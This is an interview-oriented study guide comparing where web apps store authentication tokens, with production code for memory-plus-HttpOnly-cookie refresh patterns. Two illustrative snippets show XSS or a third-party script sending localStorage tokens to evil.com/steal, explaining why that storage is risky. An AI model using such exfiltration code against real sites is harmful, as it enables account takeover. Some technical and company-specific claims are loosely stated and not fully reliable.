
────────────────────────────────────
# 128. Token Storage
────────────────────────────────────

## 1. High-Level Explanation (Frontend Interview Level)

**Token Storage** refers to where and how authentication tokens (access tokens, refresh tokens, session tokens) are stored in a web application. This is a critical security decision that impacts:

- **Security posture**: Risk of XSS, CSRF, token theft
- **User experience**: Session persistence, auto-login
- **Cross-tab behavior**: Shared sessions vs isolated
- **Performance**: Token retrieval speed, API latency

### Storage Options:
1. **Cookies** (HttpOnly, Secure, SameSite)
2. **LocalStorage**
3. **SessionStorage**
4. **Memory (JavaScript variable)**
5. **IndexedDB** (rare for tokens)

### Why it exists:
Modern web apps use token-based authentication (JWT, OAuth). Unlike session cookies managed entirely by the server, tokens require explicit frontend storage decisions with security trade-offs.

### When used:
- Every authenticated SPA, MPA, or hybrid app
- OAuth flows, JWT authentication, API authorization
- SSO implementations, mobile web apps

### Role in large-scale systems:
At FAANG scale, token storage decisions affect millions of users. Poor choices lead to security breaches, leaked credentials, and compliance violations (GDPR, SOC2).

────────────────────────────────────
## 2. Deep-Dive Explanation (Senior / Staff Level)
────────────────────────────────────

### **Architecture & Security Boundaries**

#### **A. HttpOnly Cookies (MOST SECURE for access tokens)**
```
Browser → Server sets: Set-Cookie: token=xyz; HttpOnly; Secure; SameSite=Strict
         → JavaScript CANNOT access this cookie
         → Sent automatically with every request to domain
```

**Pros:**
- ✅ **Immune to XSS**: JavaScript cannot read the token
- ✅ **Automatic transmission**: No manual header injection
- ✅ **Secure by default**: Secure flag ensures HTTPS-only

**Cons:**
- ❌ **CSRF vulnerability**: Requires CSRF tokens or SameSite
- ❌ **CORS complexity**: Needs credentials: true, server CORS config
- ❌ **Cross-domain limits**: Subdomain/domain restrictions

**Best for:**
- Traditional MPAs
- SPAs with backend-for-frontend (BFF) pattern
- High-security apps (banking, healthcare)

---

#### **B. LocalStorage (COMMON but RISKY)**
```javascript
localStorage.setItem('accessToken', token);
const token = localStorage.getItem('accessToken');
```

**Pros:**
- ✅ **Persists across tabs/windows**
- ✅ **Survives browser restart**
- ✅ **Simple API**, easy to use
- ✅ **No CORS issues**

**Cons:**
- ❌ **Vulnerable to XSS**: Any script can read it
- ❌ **Accessible to all scripts** (including third-party)
- ❌ **10MB limit** (not a real issue for tokens)
- ❌ **Synchronous API** (blocks main thread)

**Risk scenario:**
```javascript
// Attacker injects script via XSS
<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: localStorage.getItem('accessToken')
  });
</script>
```

**Best for:**
- Low-security apps (blogs, marketing sites)
- When CORS complexity is prohibitive
- Prototypes, demos

---

#### **C. SessionStorage (BETTER than LocalStorage)**
```javascript
sessionStorage.setItem('accessToken', token);
```

**Pros:**
- ✅ **Tab-isolated**: Each tab has separate storage
- ✅ **Clears on tab close**: Reduced exposure window
- ✅ **Still vulnerable to XSS** (same as LocalStorage)

**Cons:**
- ❌ **Lost on refresh** (unless using `beforeunload` tricks)
- ❌ **Not shared across tabs**
- ❌ **Still XSS-vulnerable**

**Best for:**
- Temporary sessions
- Multi-account scenarios (each tab = different user)
- Exam portals, banking (force re-auth on new tab)

---

#### **D. Memory Storage (JavaScript Variable)**
```javascript
let accessToken = null;

function setToken(token) {
  accessToken = token;
}

function getToken() {
  return accessToken;
}
```

**Pros:**
- ✅ **Most secure from XSS**: Lost on page refresh
- ✅ **No persistence**: Reduces attack window
- ✅ **Fast access**: In-memory, no I/O

**Cons:**
- ❌ **Lost on refresh**: Bad UX (requires re-login)
- ❌ **Not shared across tabs**
- ❌ **Requires token refresh strategy**

**Production pattern:**
```javascript
// Store short-lived access token in memory
// Store long-lived refresh token in HttpOnly cookie

let accessToken = null;

async function getAccessToken() {
  if (accessToken && !isExpired(accessToken)) {
    return accessToken;
  }
  
  // Refresh token stored in HttpOnly cookie
  const response = await fetch('/api/refresh', {
    method: 'POST',
    credentials: 'include' // sends HttpOnly cookie
  });
  
  const { accessToken: newToken } = await response.json();
  accessToken = newToken;
  return newToken;
}
```

**Best for:**
- High-security SPAs
- Paired with HttpOnly refresh tokens
- Modern React/Vue/Angular apps

---

### **Browser Internals & Storage Mechanics**

#### **Storage APIs Under the Hood:**
```
LocalStorage/SessionStorage:
- Stored in: %AppData%\Chrome\User Data\Default\Local Storage (Windows)
- Format: SQLite database (leveldb in Chrome)
- Thread: Main thread (synchronous, blocks rendering)
- Limit: 5-10MB per origin

Cookies:
- Stored in: Browser's cookie jar (encrypted on disk)
- Sent with: Every HTTP request to matching domain
- Limit: 4KB per cookie, ~50-180 cookies per domain
```

#### **Memory Storage Reality:**
```javascript
// JavaScript variable in heap
let token = "eyJ..."; 

// Risk: DevTools can still inspect
// Risk: Browser extensions can access
// Risk: Memory dumps (advanced attacks)
```

**Why memory is still "safer":**
Page refresh → Memory cleared → Token gone → Attacker must act within single session.

---

### **Performance Implications**

| Storage | Read Time | Network Overhead | Main Thread Block |
|---------|-----------|------------------|-------------------|
| **Memory** | ~0.001ms | None | None |
| **SessionStorage** | ~0.1ms | None | Yes (sync) |
| **LocalStorage** | ~0.1ms | None | Yes (sync) |
| **Cookie** | ~0.001ms | Sent with every request | None |

**LocalStorage blocking example:**
```javascript
// BAD: Blocks main thread
for (let i = 0; i < 1000; i++) {
  localStorage.setItem(`key${i}`, data);
}

// GOOD: Batch or use async wrapper
await Promise.all(
  items.map(item => 
    new Promise(resolve => {
      setTimeout(() => {
        localStorage.setItem(item.key, item.value);
        resolve();
      }, 0);
    })
  )
);
```

---

### **Scalability Considerations**

#### **At FAANG Scale:**

1. **Token Size Matters**
   - JWT with excessive claims → 2KB cookie → 2KB × 1B requests/day = 2TB network overhead
   - Use reference tokens (opaque) for large payloads

2. **Cookie Domain Strategy**
   ```
   - Set-Cookie: token=xyz; Domain=.company.com
     → Sent to: app.company.com, api.company.com, cdn.company.com
     → Problem: CDN gets auth tokens (security risk)
   
   - BETTER:
     Set-Cookie: token=xyz; Domain=app.company.com; Path=/api
     → Only sent to /api/* routes
   ```

3. **Multi-Region Token Sync**
   - Tokens in cookies → replicated automatically by browser
   - Tokens in LocalStorage → user travels to EU → must re-authenticate (if not synced via backend)

4. **Mobile Web Considerations**
   - LocalStorage persists across PWA installs
   - Cookies may be cleared more aggressively on iOS Safari
   - Memory-only → bad UX on mobile (frequent app kills)

---

### **Trade-offs Deep Dive**

#### **Security vs UX:**
```
Most Secure                           Best UX
    ↓                                    ↓
Memory → SessionStorage → LocalStorage → Cookies (HttpOnly)
```

**FAANG Pattern (Best of Both):**
```javascript
// Access Token (short-lived, 15 min) → Memory
// Refresh Token (long-lived, 30 days) → HttpOnly Cookie

// On page load:
async function initialize() {
  const accessToken = await refreshAccessToken();
  // Store in memory, use for API calls
}

// API interceptor:
axios.interceptors.request.use(async config => {
  const token = await getValidAccessToken();
  config.headers.Authorization = `Bearer ${token}`;
  return config;
});

async function getValidAccessToken() {
  if (accessToken && !isExpired(accessToken)) {
    return accessToken;
  }
  return await refreshAccessToken();
}

async function refreshAccessToken() {
  const response = await fetch('/api/auth/refresh', {
    method: 'POST',
    credentials: 'include' // HttpOnly cookie sent automatically
  });
  const { accessToken: newToken } = await response.json();
  accessToken = newToken;
  return newToken;
}
```

---

### **Common Pitfalls & Anti-Patterns**

#### **❌ Storing Tokens in LocalStorage with Third-Party Scripts**
```javascript
// YOUR CODE:
localStorage.setItem('token', userToken);

// THIRD-PARTY ANALYTICS:
<script src="https://analytics.com/tracker.js"></script>

// INSIDE tracker.js:
fetch('https://evil.com/steal', {
  body: JSON.stringify({
    token: localStorage.getItem('token'),
    user: getUserData()
  })
});
```

#### **❌ Using Cookies Without SameSite**
```
Set-Cookie: token=xyz; Secure; HttpOnly
→ Vulnerable to CSRF
→ Attacker site makes request to your domain
→ Browser sends cookie automatically

FIX:
Set-Cookie: token=xyz; Secure; HttpOnly; SameSite=Strict
```

#### **❌ Storing Refresh Tokens in LocalStorage**
```javascript
// NEVER DO THIS
localStorage.setItem('refreshToken', longLivedToken);
→ XSS → Attacker steals refresh token
→ Can generate new access tokens indefinitely
→ User has no way to revoke
```

#### **❌ Not Handling Token Expiry**
```javascript
// BAD
const token = localStorage.getItem('token');
fetch('/api/data', {
  headers: { Authorization: `Bearer ${token}` }
});
// → Token expired → 401 → User sees error

// GOOD
async function fetchWithAuth(url) {
  let token = getToken();
  
  if (isExpired(token)) {
    token = await refreshToken();
  }
  
  return fetch(url, {
    headers: { Authorization: `Bearer ${token}` }
  });
}
```

---

### **What NOT to Do**

1. ❌ **Never store sensitive tokens in URL/query params**
   ```
   https://app.com/dashboard?token=xyz
   → Leaks in browser history, server logs, analytics
   ```

2. ❌ **Never log tokens**
   ```javascript
   console.log('Token:', accessToken); // BAD
   → Shows up in browser console → DevTools → Screenshots
   ```

3. ❌ **Never store tokens in plain cookies without flags**
   ```
   Set-Cookie: token=xyz
   → Accessible via document.cookie
   → Sent over HTTP (if not Secure)
   → Vulnerable to CSRF (if not SameSite)
   ```

4. ❌ **Never trust token expiry without server validation**
   ```javascript
   // Client-side expiry check is NOT security
   if (tokenExpiry < Date.now()) {
     // Attacker can manipulate this
   }
   → Always validate on server
   ```

────────────────────────────────────
## 3. Clear Real-World Examples
────────────────────────────────────

### **Example 1: Google (Gmail)**
```
Strategy: HttpOnly Cookies + Memory
- Session cookie: HttpOnly, Secure, SameSite=Lax
- Access token: Short-lived, in memory
- Multi-tab: Shared session via cookie
- Refresh: Silent background refresh before expiry
```

### **Example 2: Facebook**
```
Strategy: Cookies for session, LocalStorage for device tokens
- Primary session: HttpOnly cookie
- Device-specific tokens: LocalStorage (for push notifications)
- Cross-origin iframes: postMessage for token sharing
```

### **Example 3: Slack (SPA)**
```
Strategy: Memory + HttpOnly Refresh Token
- Access token (5 min): In memory (Redux store)
- Refresh token (30 days): HttpOnly cookie
- On tab focus: Check expiry, refresh if needed
- On network request: Interceptor ensures fresh token
```

### **Example 4: Banking App (High Security)**
```
Strategy: SessionStorage + Re-auth on Sensitive Actions
- Access token: SessionStorage (tab-isolated)
- Lost on refresh: Intentional (forces re-login)
- Sensitive actions (transfer): Require password re-entry
- Timeout: 5 minutes of inactivity → logout
```

### **Example 5: E-Commerce (Medium Security)**
```
Strategy: LocalStorage + Short Expiry
- Access token (1 hour): LocalStorage
- Checkout: Step-up authentication (re-enter password)
- Cart persistence: Separate from auth (LocalStorage OK)
- CSP: Strict Content-Security-Policy to prevent XSS
```

────────────────────────────────────
## 4. Interview-Oriented Explanation
────────────────────────────────────

### **Sample Interview Answer (7+ Years Level)**

> *"Token storage is a critical security decision that balances protection against XSS and CSRF with user experience. I'd approach this based on the security profile of the application.*
>
> *For high-security applications like banking or healthcare, I'd use **HttpOnly, Secure, SameSite cookies for refresh tokens** and store **access tokens in memory**. This makes tokens immune to XSS since JavaScript can't access the cookie, and memory storage means the access token is cleared on page refresh, limiting exposure.*
>
> *The trade-off is UX—users need to refresh their token silently on page load. We handle this with a refresh endpoint that validates the HttpOnly cookie and returns a new access token to store in memory. This pattern is what Auth0 and Okta recommend.*
>
> *For medium-security SPAs, LocalStorage with short expiry (15-30 min) and robust CSP is acceptable if the team has strong XSS prevention practices—input sanitization, React's JSX escaping, no dangerouslySetInnerHTML, and third-party script auditing.*
>
> *The key is: **never store long-lived refresh tokens client-side except in HttpOnly cookies**. That's the token that can regenerate access indefinitely, so it must be the most protected.*
>
> *At scale, we'd also consider token size (JWTs bloat cookie headers), rotation strategies (refresh tokens rotate on each use), and revocation (maintain a server-side blacklist for compromised tokens)."*

---

### **Likely Follow-Up Questions**

1. **Q: "Why not just use LocalStorage everywhere? It's simpler."**
   - **A:** *"LocalStorage is accessible to any JavaScript on the page, including third-party scripts. One XSS vulnerability—a compromised dependency, a malicious browser extension, or an unescaped user input—and an attacker can exfiltrate tokens. HttpOnly cookies and memory storage close that vector. The complexity of CORS and silent refresh is worth it for financial or health data."*

2. **Q: "How do you handle token refresh without disrupting the user?"**
   - **A:** *"We use an axios/fetch interceptor that checks token expiry before each request. If expiring within 5 minutes, we proactively refresh. We also refresh on page load. The refresh endpoint uses the HttpOnly cookie, so the user doesn't need to re-authenticate unless the refresh token itself expires (usually 30 days). This gives seamless UX while maintaining security."*

3. **Q: "What if the user has multiple tabs open?"**
   - **A:** *"Depends on the storage. LocalStorage is shared across tabs, so all tabs share the same token (good for UX, but one compromised tab compromises all). SessionStorage is tab-isolated (better security, but user must log in per tab). Cookies are shared if Domain and Path match. Memory is tab-isolated and doesn't survive refresh. For most SPAs, LocalStorage or cookies with shared sessions provide the best UX. For high-security, tab isolation with SessionStorage is acceptable."*

4. **Q: "How do you prevent CSRF with cookies?"**
   - **A:** *"Three layers: 1) SameSite=Strict or Lax (blocks cross-origin cookie sending), 2) CSRF tokens (server generates random token, client includes in request header), 3) Double-submit cookies (separate cookie and header value must match). Modern apps often rely on SameSite alone, but defense-in-depth suggests combining strategies. Also, for SPAs making JSON API calls, not traditional form posts, CSRF risk is lower since browsers don't auto-submit JSON."*

5. **Q: "What's your stance on JWT vs opaque tokens?"**
   - **A:** *"JWT is stateless and embeds claims, which is great for microservices (no shared session store). But JWTs can't be revoked without a blacklist (defeating statelessness) or using short expiry with refresh tokens. Opaque tokens are references—server looks up the session. For frontend, I prefer opaque refresh tokens (can revoke in DB) and short-lived JWT access tokens (stateless validation). This balances security, performance, and revocation capability."*

---

### **Comparison: Storage Options**

| Criteria | HttpOnly Cookie | LocalStorage | SessionStorage | Memory |
|----------|----------------|--------------|----------------|---------|
| **XSS Protection** | ✅ Excellent | ❌ None | ❌ None | ✅ Good (limited window) |
| **CSRF Protection** | ⚠️ Needs SameSite | ✅ Immune | ✅ Immune | ✅ Immune |
| **Persist Across Tabs** | ✅ Yes | ✅ Yes | ❌ No | ❌ No |
| **Persist After Refresh** | ✅ Yes | ✅ Yes | ⚠️ Sometimes | ❌ No |
| **CORS Complexity** | ⚠️ High | ✅ Low | ✅ Low | ✅ Low |
| **Third-Party Access** | ❌ No | ✅ Yes (risk) | ✅ Yes (risk) | ⚠️ Via DevTools |
| **Best For** | Traditional auth | Low-security SPAs | Tab-isolated sessions | High-security SPAs |

---

### **Verbal Guidance for Interviews**

- **Start with security context**: "The app's security profile drives the decision..."
- **Acknowledge trade-offs explicitly**: "LocalStorage is simpler but opens XSS vectors..."
- **Mention FAANG patterns**: "Companies like Google use HttpOnly cookies for refresh tokens and memory for access tokens..."
- **Discuss scale impact**: "At 10M requests/day, a 2KB JWT in cookies adds X MB of bandwidth..."
- **Prepare for pushback**: If interviewer says "But LocalStorage is fine," respond with: *"It depends on threat model. For public blogs, yes. For apps handling PII, I'd argue against it. One compromised script or dependency, and tokens are exposed. HttpOnly cookies prevent that entire class of attack."*

────────────────────────────────────
## 5. Code Examples
────────────────────────────────────

### **Example 1: Memory + HttpOnly Pattern (Production-Grade)**

```javascript
// authService.js
class AuthService {
  constructor() {
    this.accessToken = null;
    this.tokenExpiry = null;
    this.refreshPromise = null; // Prevents concurrent refresh calls
  }

  async getAccessToken() {
    // If token exists and valid, return it
    if (this.accessToken && this.tokenExpiry > Date.now() + 60000) {
      return this.accessToken;
    }

    // If refresh already in progress, wait for it
    if (this.refreshPromise) {
      return this.refreshPromise;
    }

    // Start refresh
    this.refreshPromise = this.refreshAccessToken();
    
    try {
      const token = await this.refreshPromise;
      return token;
    } finally {
      this.refreshPromise = null;
    }
  }

  async refreshAccessToken() {
    try {
      const response = await fetch('/api/auth/refresh', {
        method: 'POST',
        credentials: 'include', // Send HttpOnly cookie
        headers: {
          'Content-Type': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error('Refresh failed');
      }

      const { accessToken, expiresIn } = await response.json();
      
      this.accessToken = accessToken;
      this.tokenExpiry = Date.now() + expiresIn * 1000;
      
      return accessToken;
    } catch (error) {
      this.logout();
      throw error;
    }
  }

  logout() {
    this.accessToken = null;
    this.tokenExpiry = null;
    // Call logout endpoint to clear HttpOnly cookie
    fetch('/api/auth/logout', {
      method: 'POST',
      credentials: 'include'
    });
    window.location.href = '/login';
  }
}

export const authService = new AuthService();
```

```javascript
// apiClient.js
import axios from 'axios';
import { authService } from './authService';

const apiClient = axios.create({
  baseURL: '/api',
  withCredentials: true
});

// Request interceptor: Inject token
apiClient.interceptors.request.use(
  async (config) => {
    const token = await authService.getAccessToken();
    config.headers.Authorization = `Bearer ${token}`;
    return config;
  },
  (error) => Promise.reject(error)
);

// Response interceptor: Handle 401
apiClient.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;
    
    // If 401 and not already retried
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;
      
      try {
        const token = await authService.refreshAccessToken();
        originalRequest.headers.Authorization = `Bearer ${token}`;
        return apiClient(originalRequest);
      } catch (refreshError) {
        authService.logout();
        return Promise.reject(refreshError);
      }
    }
    
    return Promise.reject(error);
  }
);

export default apiClient;
```

**Why this code structure:**
- Singleton `AuthService` ensures one refresh call across the app
- `refreshPromise` prevents race conditions (multiple components refreshing simultaneously)
- Memory storage clears on page refresh (security)
- HttpOnly cookie persists (UX)
- Interceptor ensures all API calls have fresh tokens

---

### **Example 2: LocalStorage with Expiry (Medium Security)**

```javascript
// tokenStorage.js
const TOKEN_KEY = 'app_access_token';
const EXPIRY_KEY = 'app_token_expiry';

export const tokenStorage = {
  setToken(token, expiresIn) {
    const expiry = Date.now() + expiresIn * 1000;
    localStorage.setItem(TOKEN_KEY, token);
    localStorage.setItem(EXPIRY_KEY, expiry.toString());
  },

  getToken() {
    const token = localStorage.getItem(TOKEN_KEY);
    const expiry = localStorage.getItem(EXPIRY_KEY);
    
    if (!token || !expiry) return null;
    
    // Check if expired
    if (Date.now() >= parseInt(expiry, 10)) {
      this.clearToken();
      return null;
    }
    
    return token;
  },

  clearToken() {
    localStorage.removeItem(TOKEN_KEY);
    localStorage.removeItem(EXPIRY_KEY);
  },

  isExpired() {
    const expiry = localStorage.getItem(EXPIRY_KEY);
    return expiry ? Date.now() >= parseInt(expiry, 10) : true;
  }
};
```

**Trade-off:** Simple but XSS-vulnerable. Only use with:
- Strict CSP
- No third-party scripts
- Robust input sanitization
- Short token expiry (15-30 min)

---

### **Example 3: Cross-Tab Synchronization**

```javascript
// Listen for storage events (other tabs updating token)
window.addEventListener('storage', (event) => {
  if (event.key === 'app_access_token') {
    if (event.newValue === null) {
      // Token cleared in another tab → logout
      window.location.href = '/login';
    } else {
      // Token updated in another tab → refresh current tab's state
      console.log('Token updated in another tab');
    }
  }
});

// Broadcast logout to all tabs
function logoutAllTabs() {
  localStorage.removeItem('app_access_token');
  // Storage event fires in other tabs
}
```

────────────────────────────────────
## 6. Why & How Summary
────────────────────────────────────

### **Why It Matters**

1. **Security**: Token theft is the #1 vector for account takeover. Poor storage = breach.
2. **Compliance**: GDPR, HIPAA, PCI-DSS mandate secure token handling.
3. **UX**: Balance security with seamless experience (no re-login every page load).
4. **Scale**: At 100M users, token size and network overhead matter.
5. **Business Impact**: One leaked token database = millions in fines, lost trust.

### **How It Works (Technical Summary)**

```
┌─────────────────────────────────────────────────────┐
│ USER LOGS IN                                        │
└─────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────┐
│ SERVER RESPONSE:                                    │
│ - Access Token (short-lived, 15 min) → JSON body   │
│ - Refresh Token (long-lived, 30 days) → HttpOnly   │
│   Cookie                                            │
└─────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────┐
│ FRONTEND STORES:                                    │
│ - Access Token → Memory (JavaScript variable)      │
│ - Refresh Token → Already in browser cookie jar    │
│   (not accessible to JS)                            │
└─────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────┐
│ API CALLS:                                          │
│ - Interceptor checks: Is access token expired?     │
│   - No → Use it (Authorization: Bearer <token>)    │
│   - Yes → Call /refresh (sends HttpOnly cookie)    │
│           → Get new access token → Retry original  │
│             request                                 │
└─────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────┐
│ PAGE REFRESH:                                       │
│ - Memory cleared → Access token lost               │
│ - On page load → Call /refresh → Get new access    │
│   token                                             │
│ - Seamless UX (user doesn't see login screen)      │
└─────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────┐
│ LOGOUT:                                             │
│ - Clear memory token                               │
│ - Call /logout → Server clears HttpOnly cookie    │
│ - Redirect to /login                               │
└─────────────────────────────────────────────────────┘
```

**Key Principle:**  
**Short-lived secrets in less secure storage (memory, localStorage) + Long-lived secrets in most secure storage (HttpOnly cookies) = Best balance of security and UX.**
